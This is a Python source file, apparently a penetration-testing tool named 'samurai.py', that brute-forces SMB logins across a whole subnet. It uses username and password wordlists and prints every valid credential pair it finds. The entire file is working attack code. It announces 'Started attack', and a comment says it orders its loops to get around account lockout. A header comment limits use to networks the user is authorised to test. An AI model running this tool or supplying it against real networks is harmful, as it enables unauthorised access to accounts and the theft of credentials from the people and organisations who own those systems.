#Property of DataandGoliath. Please don't use in malicious applications, and only on networks you are expressly allowed to test on (i.e., networks you have permission to attack every host on)
from smb import SMBConnection #pip install pysmb
from nmb.NetBIOS import NetBIOS
from threading import *
from queue import Queue
from datetime import datetime
from time import sleep
import ipcalc #pip install ipcalc
from socket import *
import sys

class SMBThread(Thread):
    def __init__(self,hosts,usernames,passwords,printer,terminator,verbose):
        Thread.__init__(self)

        self.hosts = hosts
        self.usernames = usernames
        self.passwords = passwords
        self.printer = printer
        self.terminator = terminator
        self.verbose = verbose

        self.start()

    def connect_smb(self,host,username,password):
            try:
                #remote_machine_name = str(getfqdn(host))
                nbs = NetBIOS(broadcast = True, listen_port = 0)
                remote_machine_name = str(nbs.queryIPForName(host,timeout=10)[0])
                nbs.close()
                if not remote_machine_name:
                    print("Noname")
                    return 0
                conn = SMBConnection.SMBConnection(str(username),str(password),'Samurai',remote_machine_name,use_ntlm_v2=True)
                if conn.connect(host,139,timeout=10) == True: #assert conn.connect(host,139,timeout=10)
                    conn.close()
                    return 1
                else:
                    return 0
            except Exception as e:
                return 0
            
            
    def run(self):
        while not self.hosts.empty() and not self.terminator.isSet():
            host = self.hosts.get()
            for password in self.passwords[:]: #Go in username iteration to boost speed by escaping lockout
                for username in self.usernames[:]:
                    response = self.connect_smb(host,username,password)
                    if response == 1:
                        self.printer.put("[{}] Valid SMB Credentials found for {} | {}:{}".format(datetime.now(),host,username,password))
                    elif response == 0 and self.verbose:
                        self.printer.put("[{}] Failed SMB Credentials for {} | {}:{}".format(datetime.now(),host,username,password))
                sleep(1)
        self.printer.put("[CONTROL] THREAD FINISH")
hosts = Queue()
printer = Queue()
terminator = Event()
usernames = []
passwords = []
try:
    print("Loading credentials...")
    if sys.argv[1].lower() == "localhost":
        hosts.put("127.0.0.1")
    else:
        for ip in ipcalc.Network(sys.argv[1]):
            hosts.put(str(ip))
    f = open(sys.argv[3],"r")
    passes = f.readlines()
    f.close()
    for password in passes:
        passwords.append(password.strip("\r").strip("\n"))

    f = open(sys.argv[2],"r")
    users = f.readlines()
    f.close()
    for username in users:
        usernames.append(username.strip("\r").strip("\n"))
    try:
        if sys.argv[4].lower() == "-v" or sys.argv[4].lower() == "--verbose":
            verbose = True
    except:
        verbose = False

except Exception as e:
    print("Usage:\npython samurai.py [subnet] [username file] [password file] (-v || --verbose)")
    print("\nExamples:\npython samurai.py 192.168.0.1/24 users.txt passes.txt -v")
    print("python samurai.py 192.168.0.11 users.txt passes.txt -v")
    print("python samurai.py 192.168.0.1/16 users.txt passes.txt")
    print("python samurai.py 192.168.0.13 users.txt passes.txt")
    exit("\nError code: Missing arguments.\n")

sys.stdout.write("[{}] Started attack\n".format(datetime.now()))
threads = 0
closedthreads = 0
creds = 0
for i in range(10):
    SMBThread(hosts,usernames,passwords,printer,terminator,verbose)
    threads+=1

try:
    while True:
        if not printer.empty():
            item = printer.get()
            if item[:len("[CONTROL]")] == "[CONTROL]":
                if item == "[CONTROL] THREAD FINISH":
                    closedthreads+=1
                    if closedthreads == threads:
                        exit("[{}] Attack finished. {} valid credential set(s) found.".format(datetime.now(),creds))
            else:
                if "Valid SMB Credentials" in item:
                    creds += 1
                print(item)
except Exception as e:
    terminator.set()
    exit("\n[{}] User requested interrupt".format(datetime.now()))
